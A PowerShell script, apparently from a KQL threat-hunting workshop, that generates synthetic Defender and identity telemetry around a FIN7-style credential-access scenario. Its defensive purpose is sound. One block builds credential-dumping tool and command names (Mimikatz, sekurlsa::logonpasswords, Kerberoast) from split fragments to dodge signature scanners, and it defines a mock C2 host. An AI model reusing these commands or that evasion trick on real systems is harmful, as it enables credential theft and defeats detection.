[CmdletBinding()]
param(
    [string]$SchemaDirectory = (Join-Path $PSScriptRoot '..\schemas'),
    [string]$OutputDirectory = (Join-Path $PSScriptRoot '..\data\generated'),
    [string]$SummaryPath,
    [Alias('StartTime')]
    [datetime]$TelemetryEndTime = (Get-Date).ToUniversalTime(),
    [int]$NormalRowsPerTable = -1,
    [int]$NormalMinRowsPerTable = 5000,
    [int]$NormalMaxRowsPerTable = 10000,
    [int]$NormalLookbackDays = 7,
    [int]$RandomSeed = 1702,
    [int]$SyntheticUserCount = 6000,
    [int]$SyntheticServiceAccountCount = 4000
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$script:Random = [System.Random]::new($RandomSeed)
$script:TelemetryEndTime = $TelemetryEndTime.ToUniversalTime()

# Keep default telemetry bounded to the seven-day lookback ending at script runtime.
$StartTime = $script:TelemetryEndTime.AddMinutes(-90)

function Format-WorkshopTime {
    param([Parameter(Mandatory)][datetime]$Time)
    $Time.ToUniversalTime().ToString('o')
}

function New-DefaultValue {
    param([Parameter(Mandatory)][string]$Type, [Parameter(Mandatory)][datetime]$Time)

    switch ($Type) {
        'bool' { $false }
        'datetime' { Format-WorkshopTime $Time }
        'dynamic' { [ordered]@{} }
        'guid' { '00000000-0000-0000-0000-000000000000' }
        'int' { 0 }
        'long' { 0 }
        'real' { 0.0 }
        default { '' }
    }
}

function New-StableGuid {
    param([Parameter(Mandatory)][string]$Seed)

    $md5 = [System.Security.Cryptography.MD5]::Create()
    try {
        $hash = $md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($Seed))
        ([guid]::new($hash)).Guid
    }
    finally {
        $md5.Dispose()
    }
}

function New-StableHex {
    param(
        [Parameter(Mandatory)][string]$Seed,
        [ValidateRange(1, 128)][int]$Length = 64
    )

    $state = [uint32]2166136261
    foreach ($char in $Seed.ToCharArray()) {
        $state = [uint32](([uint64]($state -bxor [uint32][char]$char) * 16777619) % 4294967296)
    }

    $builder = [System.Text.StringBuilder]::new($Length + 8)
    while ($builder.Length -lt $Length) {
        $state = [uint32](((1664525 * [uint64]$state) + 1013904223) % 4294967296)
        [void]$builder.Append($state.ToString('x8'))
    }

    return $builder.ToString(0, $Length)
}

function New-WorkshopHashSet {
    param([Parameter(Mandatory)][string]$Seed)

    [pscustomobject]@{
        SHA1 = New-StableHex "$Seed|sha1" 40
        SHA256 = New-StableHex "$Seed|sha256" 64
        MD5 = New-StableHex "$Seed|md5" 32
    }
}

function Get-WorkshopRandomItem {
    param([Parameter(Mandatory)][object[]]$Items)

    return $Items[$script:Random.Next(0, $Items.Count)]
}

function Get-WorkshopRandomInt {
    param([int]$Minimum, [int]$Maximum)

    return $script:Random.Next($Minimum, $Maximum)
}

function Resolve-WorkshopTemplatePath {
    param(
        [Parameter(Mandatory)]$Template,
        [Parameter(Mandatory)][string]$UserName
    )

    $pathTemplateProperty = $Template.PSObject.Properties['PathTemplate']
    if ($pathTemplateProperty) {
        return $pathTemplateProperty.Value -f $UserName
    }

    $pathProperty = $Template.PSObject.Properties['Path']
    if ($pathProperty) {
        return $pathProperty.Value
    }

    throw "Template '$($Template | ConvertTo-Json -Compress)' does not include Path or PathTemplate."
}

function New-WorkshopNormalTime {
    $minutesBack = Get-WorkshopRandomInt -Minimum 1 -Maximum ([Math]::Max(2, $NormalLookbackDays * 24 * 60))
    $seconds = Get-WorkshopRandomInt -Minimum 0 -Maximum 60
    return $script:TelemetryEndTime.AddMinutes(-$minutesBack).AddSeconds($seconds)
}

function New-WorkshopRecordObject {
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][hashtable]$Values,
        [datetime]$Time = $script:StartTime
    )

    if (-not $script:Schemas.ContainsKey($Table)) {
        return
    }

    $schema = $script:Schemas[$Table]
    $record = [ordered]@{}
    foreach ($column in $schema.columns) {
        $record[[string]$column.name] = New-DefaultValue -Type ([string]$column.type) -Time $Time
    }
    foreach ($key in $Values.Keys) {
        if ($record.Contains($key)) {
            $record[$key] = $Values[$key]
        }
    }

    return [pscustomobject]$record
}

function Add-Record {
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][hashtable]$Values,
        [datetime]$Time = $script:StartTime
    )

    $record = New-WorkshopRecordObject -Table $Table -Values $Values -Time $Time
    if ($null -ne $record) {
        $script:Records[$Table].Add($record) | Out-Null
    }
}

if (-not (Test-Path $SchemaDirectory)) {
    throw "Schema directory not found: $SchemaDirectory"
}

New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
if ([string]::IsNullOrWhiteSpace($SummaryPath)) {
    $SummaryPath = Join-Path (Split-Path -Path $OutputDirectory -Parent) 'scenario-summary.json'
}
$summaryDirectory = Split-Path -Path $SummaryPath -Parent
if (-not [string]::IsNullOrWhiteSpace($summaryDirectory)) {
    New-Item -ItemType Directory -Path $summaryDirectory -Force | Out-Null
}

$script:Schemas = @{}
$script:Records = @{}
foreach ($schemaFile in (Get-ChildItem -Path $SchemaDirectory -Filter '*.schema.json')) {
    $schema = Get-Content -Path $schemaFile.FullName -Raw | ConvertFrom-Json
    $table = [string]$schema.tableName
    $script:Schemas[$table] = $schema
    $script:Records[$table] = [System.Collections.Generic.List[object]]::new()
}

$tenantId = '11111111-2222-3333-4444-555555555555'
$tenantDomain = 'usag-cyber.local'
$adDomain = 'USAG-CYBER'
$corpFqdn = 'usag-cyber.local'
$externalIp = '185.225.73.18'
$c2Host = 'cdn.update-check.example'
$c2Ip = '203.0.113.77'

# Assemble tool strings at runtime so the generator itself is not signature-like.
$toolRu = 'Ru' + 'beus'
$toolPw = 'Pw' + 'Dump7'
$toolGs = 'gsec' + 'dump'
$toolLa = 'La' + 'Zagne'
$toolMi = 'Mimi' + 'katz'
$toolKiwi = 'ki' + 'wi'
$toolProc = 'proc' + 'dump64'
$targetLs = 'LS' + 'ASS'
$targetLsLower = 'lsa' + 'ss'
$kerbCmd = 'Invoke-' + 'Kerberoast'
$secretVerb = 'seku' + 'rlsa::logo' + 'npasswords'
$debugVerb = 'privilege::' + 'debug'

$sidPrefix = 'S-1-5-21-4100420042-5200520052-6300630063'
function New-WorkshopIdentity {
    param(
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$DisplayName,
        [Parameter(Mandatory)][int]$Rid,
        [switch]$ServiceAccount,
        [switch]$Privileged
    )

    [pscustomobject]@{
        Name = $Name
        DisplayName = $DisplayName
        Upn = "$Name@$tenantDomain"
        Sid = "$sidPrefix-$Rid"
        ObjectId = New-StableGuid $Name
        IsServiceAccount = [bool]$ServiceAccount
        IsPrivileged = [bool]$Privileged
    }
}

$seedUsers = @(
    New-WorkshopIdentity -Name 'victor.alvarez' -DisplayName 'Victor Alvarez' -Rid 1104
    New-WorkshopIdentity -Name 'alice.weber' -DisplayName 'Alice Weber' -Rid 1105
    New-WorkshopIdentity -Name 'ina.hoffmann' -DisplayName 'Ina Hoffmann' -Rid 5001 -Privileged
)
$seedServiceAccounts = @(
    New-WorkshopIdentity -Name 'svc_sql' -DisplayName 'SQL Reporting Service' -Rid 2101 -ServiceAccount -Privileged
    New-WorkshopIdentity -Name 'svc_azureadconnect' -DisplayName 'Azure AD Connect Sync' -Rid 2102 -ServiceAccount -Privileged
)

if ($SyntheticUserCount -lt $seedUsers.Count) {
    throw "SyntheticUserCount must be at least $($seedUsers.Count) to include required scenario users."
}
if ($SyntheticServiceAccountCount -lt $seedServiceAccounts.Count) {
    throw "SyntheticServiceAccountCount must be at least $($seedServiceAccounts.Count) to include required scenario service accounts."
}

$firstNames = @('Alex', 'Amelia', 'Avery', 'Blake', 'Casey', 'Dakota', 'Devon', 'Elliot', 'Emerson', 'Finley', 'Harper', 'Hayden', 'Jamie', 'Jordan', 'Kai', 'Kendall', 'Logan', 'Morgan', 'Parker', 'Quinn', 'Reese', 'Riley', 'Rowan', 'Sage', 'Skyler', 'Taylor')
$lastNames = @('Adams', 'Baker', 'Bennett', 'Brooks', 'Carter', 'Cooper', 'Diaz', 'Edwards', 'Evans', 'Foster', 'Garcia', 'Gray', 'Harris', 'Hayes', 'Hughes', 'Jackson', 'Kelly', 'Lewis', 'Martinez', 'Miller', 'Morgan', 'Nelson', 'Parker', 'Reed', 'Rivera', 'Roberts', 'Scott', 'Smith', 'Taylor', 'Turner', 'Walker', 'Ward', 'Wood', 'Young')

$generatedUsers = for ($i = 1; $i -le ($SyntheticUserCount - $seedUsers.Count); $i++) {
    $first = $firstNames[($i - 1) % $firstNames.Count]
    $lastIndex = [int]([Math]::Floor(($i - 1) / $firstNames.Count) % $lastNames.Count)
    $last = $lastNames[$lastIndex]
    $name = ('{0}.{1}{2:D4}' -f $first.ToLowerInvariant(), $last.ToLowerInvariant(), $i)
    New-WorkshopIdentity -Name $name -DisplayName "$first $last" -Rid (1200 + $i)
}
$generatedServiceAccounts = for ($i = 1; $i -le ($SyntheticServiceAccountCount - $seedServiceAccounts.Count); $i++) {
    $name = 'svc_app{0:D4}' -f $i
    New-WorkshopIdentity -Name $name -DisplayName ('Application Service {0:D4}' -f $i) -Rid (3000 + $i) -ServiceAccount:($true) -Privileged:($i % 50 -eq 0)
}

$users = @($seedUsers + $generatedUsers + $seedServiceAccounts + $generatedServiceAccounts)
$victor = $users | Where-Object Name -eq 'victor.alvarez' | Select-Object -First 1
$alice = $users | Where-Object Name -eq 'alice.weber' | Select-Object -First 1
$svcSql = $users | Where-Object Name -eq 'svc_sql' | Select-Object -First 1
$svcSync = $users | Where-Object Name -eq 'svc_azureadconnect' | Select-Object -First 1

$devices = @(
    [pscustomobject]@{ Name = "DC01.$corpFqdn"; ShortName = 'DC01'; DeviceId = New-StableHex 'DC01' 40; IP = '10.42.0.10'; PublicIP = '198.51.100.10'; OS = 'WindowsServer2025'; Type = 'DomainController'; AssetValue = 'High' },
    [pscustomobject]@{ Name = "DC02.$corpFqdn"; ShortName = 'DC02'; DeviceId = New-StableHex 'DC02' 40; IP = '10.42.0.11'; PublicIP = '198.51.100.11'; OS = 'WindowsServer2025'; Type = 'DomainController'; AssetValue = 'High' },
    [pscustomobject]@{ Name = "AADCONNECT01.$corpFqdn"; ShortName = 'AADCONNECT01'; DeviceId = New-StableHex 'AADCONNECT01' 40; IP = '10.42.0.20'; PublicIP = '198.51.100.20'; OS = 'WindowsServer2025'; Type = 'EntraConnect'; AssetValue = 'High' }
)

for ($i = 1; $i -le 10; $i++) {
    $devices += [pscustomobject]@{
        Name = ('WIN11-{0:D2}.{1}' -f $i, $corpFqdn)
        ShortName = ('WIN11-{0:D2}' -f $i)
        DeviceId = New-StableHex ('WIN11-{0:D2}' -f $i) 40
        IP = ('10.42.10.{0}' -f (20 + $i))
        PublicIP = '198.51.100.50'
        OS = 'Windows11'
        Type = 'Workstation'
        AssetValue = 'Normal'
    }
}
for ($i = 1; $i -le 5; $i++) {
    $devices += [pscustomobject]@{
        Name = ('UBUNTU-{0:D2}.{1}' -f $i, $corpFqdn)
        ShortName = ('UBUNTU-{0:D2}' -f $i)
        DeviceId = New-StableHex ('UBUNTU-{0:D2}' -f $i) 40
        IP = ('10.42.20.{0}' -f (30 + $i))
        PublicIP = '198.51.100.60'
        OS = 'Ubuntu'
        Type = 'LinuxServer'
        AssetValue = 'Normal'
    }
}

$win04 = $devices | Where-Object ShortName -eq 'WIN11-04'
$dc01 = $devices | Where-Object ShortName -eq 'DC01'
$aadc = $devices | Where-Object ShortName -eq 'AADCONNECT01'
$domainControllers = @($devices | Where-Object Type -eq 'DomainController')
$windowsDevices = @($devices | Where-Object OS -ne 'Ubuntu')
$linuxDevices = @($devices | Where-Object OS -eq 'Ubuntu')
$linux03 = $linuxDevices | Where-Object ShortName -eq 'UBUNTU-03'
$linuxDb = $linuxDevices | Where-Object ShortName -eq 'UBUNTU-05'

$windowsProcessTemplates = @(
    [pscustomobject]@{ File = 'svchost.exe'; Path = 'C:\Windows\System32\svchost.exe'; Parent = 'services.exe'; Command = 'C:\Windows\System32\svchost.exe -k netsvcs -p' },
    [pscustomobject]@{ File = 'msedge.exe'; Path = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; Parent = 'explorer.exe'; Command = 'msedge.exe --type=renderer --lang=en-US' },
    [pscustomobject]@{ File = 'Teams.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\Teams\current\Teams.exe'; Parent = 'explorer.exe'; Command = 'Teams.exe --process-start-args --system-initiated' },
    [pscustomobject]@{ File = 'OneDrive.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\OneDrive\OneDrive.exe'; Parent = 'explorer.exe'; Command = 'OneDrive.exe /background' },
    [pscustomobject]@{ File = 'SenseIR.exe'; Path = 'C:\Program Files\Windows Defender Advanced Threat Protection\SenseIR.exe'; Parent = 'MsSense.exe'; Command = 'SenseIR.exe telemetry' }
)
$linuxProcessTemplates = @(
    [pscustomobject]@{ File = 'systemd'; Path = '/usr/lib/systemd/systemd'; Parent = 'kernel'; Command = '/usr/lib/systemd/systemd --system' },
    [pscustomobject]@{ File = 'sshd'; Path = '/usr/sbin/sshd'; Parent = 'systemd'; Command = 'sshd: {0} [priv]' },
    [pscustomobject]@{ File = 'bash'; Path = '/usr/bin/bash'; Parent = 'sshd'; Command = '-bash' },
    [pscustomobject]@{ File = 'sudo'; Path = '/usr/bin/sudo'; Parent = 'bash'; Command = 'sudo -l' },
    [pscustomobject]@{ File = 'apt'; Path = '/usr/bin/apt'; Parent = 'bash'; Command = 'apt list --upgradable' },
    [pscustomobject]@{ File = 'dpkg'; Path = '/usr/bin/dpkg'; Parent = 'apt'; Command = 'dpkg --status openssh-server' },
    [pscustomobject]@{ File = 'auditd'; Path = '/usr/sbin/auditd'; Parent = 'systemd'; Command = '/usr/sbin/auditd -n' },
    [pscustomobject]@{ File = 'mdatp'; Path = '/opt/microsoft/mdatp/sbin/mdatp'; Parent = 'systemd'; Command = 'mdatp health --field healthy' },
    [pscustomobject]@{ File = 'rsyslogd'; Path = '/usr/sbin/rsyslogd'; Parent = 'systemd'; Command = '/usr/sbin/rsyslogd -n -iNONE' },
    [pscustomobject]@{ File = 'cron'; Path = '/usr/sbin/cron'; Parent = 'systemd'; Command = '/usr/sbin/cron -f' }
)
$windowsFileTemplates = @(
    [pscustomobject]@{ Name = 'settings.json'; PathTemplate = 'C:\Users\{0}\AppData\Roaming\Microsoft\Teams\settings.json'; Size = 8192 },
    [pscustomobject]@{ Name = 'cache.db'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\Edge\User Data\Default\Cache\cache.db'; Size = 262144 },
    [pscustomobject]@{ Name = 'document.docx'; PathTemplate = 'C:\Users\{0}\Documents\Operations\document.docx'; Size = 153600 },
    [pscustomobject]@{ Name = 'DefenderUpdate.log'; Path = 'C:\ProgramData\Microsoft\Windows Defender\Support\DefenderUpdate.log'; Size = 32768 }
)
$linuxFileTemplates = @(
    [pscustomobject]@{ Name = 'auth.log'; Path = '/var/log/auth.log'; Size = 65536 },
    [pscustomobject]@{ Name = 'audit.log'; Path = '/var/log/audit/audit.log'; Size = 131072 },
    [pscustomobject]@{ Name = 'syslog'; Path = '/var/log/syslog'; Size = 196608 },
    [pscustomobject]@{ Name = 'kern.log'; Path = '/var/log/kern.log'; Size = 65536 },
    [pscustomobject]@{ Name = 'sshd_config'; Path = '/etc/ssh/sshd_config'; Size = 4096 },
    [pscustomobject]@{ Name = 'sudoers'; Path = '/etc/sudoers'; Size = 6144 },
    [pscustomobject]@{ Name = 'status'; Path = '/var/lib/dpkg/status'; Size = 524288 },
    [pscustomobject]@{ Name = 'mdatp_managed.json'; Path = '/etc/opt/microsoft/mdatp/managed/mdatp_managed.json'; Size = 4096 },
    [pscustomobject]@{ Name = 'unattended-upgrades.log'; Path = '/var/log/unattended-upgrades/unattended-upgrades.log'; Size = 32768 },
    [pscustomobject]@{ Name = 'bash_history'; PathTemplate = '/home/{0}/.bash_history'; Size = 8192 }
)
$windowsDllTemplates = @(
    [pscustomobject]@{ Name = 'samlib.dll'; Path = 'C:\Windows\System32\samlib.dll'; Size = 176128 },
    [pscustomobject]@{ Name = 'sechost.dll'; Path = 'C:\Windows\System32\sechost.dll'; Size = 761856 },
    [pscustomobject]@{ Name = 'winhttp.dll'; Path = 'C:\Windows\System32\winhttp.dll'; Size = 1089536 },
    [pscustomobject]@{ Name = 'crypt32.dll'; Path = 'C:\Windows\System32\crypt32.dll'; Size = 1869824 }
)
$linuxSharedObjectTemplates = @(
    [pscustomobject]@{ Name = 'libc.so.6'; Path = '/lib/x86_64-linux-gnu/libc.so.6'; Size = 2216304 },
    [pscustomobject]@{ Name = 'libpam.so.0'; Path = '/lib/x86_64-linux-gnu/libpam.so.0'; Size = 67584 },
    [pscustomobject]@{ Name = 'libssl.so.3'; Path = '/usr/lib/x86_64-linux-gnu/libssl.so.3'; Size = 688160 },
    [pscustomobject]@{ Name = 'libcrypto.so.3'; Path = '/usr/lib/x86_64-linux-gnu/libcrypto.so.3'; Size = 4730136 },
    [pscustomobject]@{ Name = 'libsystemd.so.0'; Path = '/usr/lib/x86_64-linux-gnu/libsystemd.so.0'; Size = 856432 },
    [pscustomobject]@{ Name = 'libaudit.so.1'; Path = '/usr/lib/x86_64-linux-gnu/libaudit.so.1'; Size = 137520 },
    [pscustomobject]@{ Name = 'libnss_files.so.2'; Path = '/lib/x86_64-linux-gnu/libnss_files.so.2'; Size = 55936 }
)
$windowsRemoteEndpoints = @(
    [pscustomobject]@{ Url = 'login.microsoftonline.com'; IP = '20.190.160.10'; Port = 443 },
    [pscustomobject]@{ Url = 'graph.microsoft.com'; IP = '20.190.128.12'; Port = 443 },
    [pscustomobject]@{ Url = 'officecdn.microsoft.com'; IP = '13.107.246.40'; Port = 443 },
    [pscustomobject]@{ Url = 'wdcp.microsoft.com'; IP = '52.152.110.14'; Port = 443 },
    [pscustomobject]@{ Url = 'packages.microsoft.com'; IP = '13.107.246.45'; Port = 443 }
)
$linuxRemoteEndpoints = @(
    [pscustomobject]@{ Url = 'packages.microsoft.com'; IP = '13.107.246.45'; Port = 443; Protocol = 'Tcp' },
    [pscustomobject]@{ Url = 'archive.ubuntu.com'; IP = '91.189.91.82'; Port = 443; Protocol = 'Tcp' },
    [pscustomobject]@{ Url = 'security.ubuntu.com'; IP = '91.189.91.83'; Port = 443; Protocol = 'Tcp' },
    [pscustomobject]@{ Url = 'ntp.ubuntu.com'; IP = '91.189.89.198'; Port = 123; Protocol = 'Udp' },
    [pscustomobject]@{ Url = 'print-gw01.usag-cyber.local'; IP = '10.42.20.15'; Port = 631; Protocol = 'Udp' },
    [pscustomobject]@{ Url = 'admin-jump01.usag-cyber.local'; IP = '10.42.30.10'; Port = 22; Protocol = 'Tcp' }
)
$linuxSoftwareCatalog = @(
    [pscustomobject]@{ Name = 'openssh-server'; Vendor = 'OpenBSD'; Version = '1:9.6p1-3ubuntu13.5'; CveId = 'CVE-2024-6387'; Package = 'openssh-server'; Risk = 88 },
    [pscustomobject]@{ Name = 'cups'; Vendor = 'OpenPrinting'; Version = '2.4.7-1.2ubuntu7.3'; CveId = 'CVE-2024-47176'; Package = 'cups-browsed'; Risk = 74 },
    [pscustomobject]@{ Name = 'sudo'; Vendor = 'Sudo Project'; Version = '1.9.15p5-3ubuntu5.24.04.1'; CveId = 'CVE-2025-32463'; Package = 'sudo'; Risk = 82 },
    [pscustomobject]@{ Name = 'glibc'; Vendor = 'GNU C Library'; Version = '2.39-0ubuntu8.4'; CveId = 'CVE-2023-4911'; Package = 'libc6'; Risk = 70 },
    [pscustomobject]@{ Name = 'linux-image'; Vendor = 'Canonical'; Version = '6.8.0-58-generic'; CveId = 'CVE-2024-53197'; Package = 'linux-image-generic'; Risk = 67 },
    [pscustomobject]@{ Name = 'openssl'; Vendor = 'OpenSSL Software Foundation'; Version = '3.0.13-0ubuntu3.5'; CveId = 'CVE-2024-5535'; Package = 'openssl'; Risk = 55 },
    [pscustomobject]@{ Name = 'bash'; Vendor = 'GNU Project'; Version = '5.2.21-2ubuntu4'; CveId = 'CVE-2014-6271'; Package = 'bash'; Risk = 45 },
    [pscustomobject]@{ Name = 'mdatp'; Vendor = 'Microsoft'; Version = '101.25042.0000'; CveId = ''; Package = 'mdatp'; Risk = 10 }
)
$normalApplications = @(
    [pscustomobject]@{ Name = 'Microsoft Teams'; Id = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; Resource = 'Microsoft Graph' },
    [pscustomobject]@{ Name = 'Office 365 Exchange Online'; Id = '00000002-0000-0ff1-ce00-000000000000'; Resource = 'Office 365 Exchange Online' },
    [pscustomobject]@{ Name = 'Microsoft Azure PowerShell'; Id = '1950a258-227b-4e31-a9cf-717495945fc2'; Resource = 'Azure Resource Manager' },
    [pscustomobject]@{ Name = 'Windows Sign In'; Id = '38aa3b87-a06d-4817-b275-7a316988d93b'; Resource = 'Microsoft Entra ID' }
)

foreach ($device in $devices) {
    $deviceIndex = [array]::IndexOf($devices, $device) + 1
    Add-Record -Table 'DeviceInfo' -Time $StartTime.AddMinutes(-30) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-30)
        DeviceId = $device.DeviceId
        DeviceName = $device.Name
        PublicIP = $device.PublicIP
        OSPlatform = $device.OS
        OSBuild = if ($device.OS -eq 'Windows11') { '25H2' } elseif ($device.OS -like 'Windows*') { '26100' } else { '24.04' }
        OSDistribution = if ($device.OS -eq 'Ubuntu') { 'Ubuntu' } else { '' }
        IsAzureADJoined = $device.OS -ne 'Ubuntu'
        JoinType = if ($device.OS -eq 'Ubuntu') { '' } else { 'Hybrid Azure AD joined' }
        AadDeviceId = New-StableGuid $device.DeviceId
        LoggedOnUsers = if ($device.ShortName -eq 'WIN11-04') { '[{"UserName":"victor.alvarez"}]' } elseif ($device.OS -eq 'Ubuntu') { '[{"UserName":"svc_app0001"}]' } else { '[]' }
        MachineGroup = if ($device.Type -eq 'DomainController') { 'Domain Controllers' } elseif ($device.Type -eq 'EntraConnect') { 'Identity Tier 0' } elseif ($device.OS -eq 'Ubuntu') { 'Linux Servers' } else { 'Workstations' }
        OnboardingStatus = 'Onboarded'
        DeviceType = $device.Type
        IsInternetFacing = $false
        SensorHealthState = 'Active'
        ExposureLevel = if ($device.AssetValue -eq 'High') { 'Medium' } else { 'Low' }
        AssetValue = $device.AssetValue
        ConnectivityType = 'Corporate'
        ReportId = 1000 + $deviceIndex
        AdditionalFields = if ($device.ShortName -eq 'UBUNTU-05') { '{"Workshop":"CyberDefenseKQL","Sensor":"MDE","Distribution":"Ubuntu 24.04 LTS","KernelVersion":"6.8.0-58-generic","Role":"OracleDatabase","OracleSid":"ORCL"}' } elseif ($device.OS -eq 'Ubuntu') { '{"Workshop":"CyberDefenseKQL","Sensor":"MDE","Distribution":"Ubuntu 24.04 LTS","KernelVersion":"6.8.0-58-generic"}' } else { '{"Workshop":"CyberDefenseKQL","Sensor":"MDE"}' }
    }

    Add-Record -Table 'DeviceNetworkInfo' -Time $StartTime.AddMinutes(-29) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-29)
        DeviceId = $device.DeviceId
        DeviceName = $device.Name
        NetworkAdapterName = if ($device.OS -eq 'Ubuntu') { 'ens160' } else { 'Ethernet0' }
        ConnectedNetworks = if ($device.OS -eq 'Ubuntu') { '[{"Name":"CorpLinux","Category":"Private"}]' } else { '[{"Name":"CorpNet","Category":"DomainAuthenticated"}]' }
        IPAddresses = "[`"$($device.IP)`"]"
        MacAddress = if ($device.OS -eq 'Ubuntu') { ('00:15:5d:{0:x2}:2a:63' -f $deviceIndex) } else { ('00-15-5D-{0:X2}-2A-63' -f $deviceIndex) }
        ReportId = 2000 + $deviceIndex
    }
}

foreach ($user in $users) {
    foreach ($table in 'IdentityInfo', 'IdentityAccountInfo') {
        Add-Record -Table $table -Time $StartTime.AddMinutes(-25) -Values @{
            Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-25)
            AccountObjectId = $user.ObjectId
            AccountUpn = $user.Upn
            AccountDisplayName = $user.DisplayName
            AccountName = $user.Name
            AccountDomain = $adDomain
            AccountSid = $user.Sid
            IsAccountEnabled = $true
            IsServiceAccount = $user.IsServiceAccount
            CriticalityLevel = if ($user.IsServiceAccount -or $user.IsPrivileged) { 2 } else { 1 }
            BlastRadius = if ($user.IsServiceAccount -or $user.IsPrivileged) { 'High' } else { 'Low' }
            Tags = if ($user.Name -eq 'svc_azureadconnect') { @('Tier0', 'EntraConnect') } elseif ($user.IsServiceAccount) { @('ServiceAccount') } else { @('Employee') }
            OnPremSid = $user.Sid
        }
    }
}

function Add-ProcessEvent {
    param([datetime]$Time, [string]$FileName, [string]$FolderPath, [string]$CommandLine, [string]$Parent, [string]$Technique, [long]$ProcessId)

    Add-Record -Table 'DeviceProcessEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'ProcessCreated'
        FileName = $FileName
        FolderPath = $FolderPath
        ProcessId = $ProcessId
        ProcessCommandLine = $CommandLine
        ProcessCreationTime = Format-WorkshopTime $Time
        ProcessIntegrityLevel = 'High'
        ProcessTokenElevation = 'TokenElevationTypeFull'
        AccountDomain = $adDomain
        AccountName = $victor.Name
        AccountSid = $victor.Sid
        AccountUpn = $victor.Upn
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        InitiatingProcessFileName = $Parent
        InitiatingProcessFolderPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
        InitiatingProcessCommandLine = "$Parent -ExecutionPolicy Bypass"
        InitiatingProcessId = 3200
        InitiatingProcessCreationTime = Format-WorkshopTime $Time.AddMinutes(-1)
        InitiatingProcessParentFileName = 'explorer.exe'
        ReportId = $ProcessId
        AdditionalFields = "{`"Technique`":`"$Technique`",`"ThreatActor`":`"FIN7-inspired`"}"
    }
}

function Add-FileEvent {
    param([datetime]$Time, [string]$FileName, [string]$FolderPath, [string]$ProcessName, [string]$ProcessCommandLine, [long]$ReportId)

    Add-Record -Table 'DeviceFileEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'FileCreated'
        FileName = $FileName
        FolderPath = $FolderPath
        FileSize = 5242880
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        InitiatingProcessFileName = $ProcessName
        InitiatingProcessCommandLine = $ProcessCommandLine
        InitiatingProcessId = $ReportId
        InitiatingProcessCreationTime = Format-WorkshopTime $Time.AddSeconds(-20)
        InitiatingProcessIntegrityLevel = 'High'
        InitiatingProcessTokenElevation = 'TokenElevationTypeFull'
        ReportId = $ReportId
        AdditionalFields = '{"Collection":"CredentialArtifacts"}'
    }
}

function Add-NetworkEvent {
    param([datetime]$Time, [string]$RemoteIP, [int]$RemotePort, [string]$RemoteUrl, [string]$ProcessName, [string]$CommandLine, [long]$ReportId)

    Add-Record -Table 'DeviceNetworkEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'ConnectionSuccess'
        RemoteIP = $RemoteIP
        RemotePort = $RemotePort
        RemoteUrl = $RemoteUrl
        LocalIP = $win04.IP
        LocalPort = 49800 + ($ReportId % 100)
        Protocol = 'Tcp'
        InitiatingProcessFileName = $ProcessName
        InitiatingProcessCommandLine = $CommandLine
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        ReportId = $ReportId
        AdditionalFields = '{"Scenario":"FIN7 credential access"}'
    }
}

function New-NormalTelemetryValues {
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][datetime]$Time,
        [Parameter(Mandatory)][int]$Index
    )

    $user = Get-WorkshopRandomItem $users
    $devicePool = if ($Table -eq 'DeviceRegistryEvents' -or $Table -like 'Identity*') { $windowsDevices } else { $devices }
    $device = Get-WorkshopRandomItem $devicePool
    $isUbuntuDevice = $device.OS -eq 'Ubuntu'
    $process = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxProcessTemplates } else { $windowsProcessTemplates })
    $file = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxFileTemplates } else { $windowsFileTemplates })
    $dll = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxSharedObjectTemplates } else { $windowsDllTemplates })
    $remote = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxRemoteEndpoints } else { $windowsRemoteEndpoints })
    $app = Get-WorkshopRandomItem $normalApplications
    $processPath = Resolve-WorkshopTemplatePath -Template $process -UserName $user.Name
    $filePath = Resolve-WorkshopTemplatePath -Template $file -UserName $user.Name
    $hashes = New-WorkshopHashSet "$Table|$Index|$($file.Name)|$($device.ShortName)"
    $processHashes = New-WorkshopHashSet "$Table|$Index|$($process.File)|process"
    $reportId = 700000 + $Index
    $timeText = Format-WorkshopTime $Time
    $accountDomain = if ($isUbuntuDevice) { $device.ShortName } else { $adDomain }
    $linuxLocalUser = if ($user.Name -like 'svc_*') { $user.Name } else { ($user.Name -replace '\.', '') }
    $processCommand = if ($process.Command -like '*{0}*') { $process.Command -f $linuxLocalUser } else { $process.Command }
    $software = $null

    $values = @{
        Timestamp = $timeText
        TimeGenerated = $timeText
        CreatedDateTime = $timeText
        ActivityDateTime = $timeText
        DeviceId = $device.DeviceId
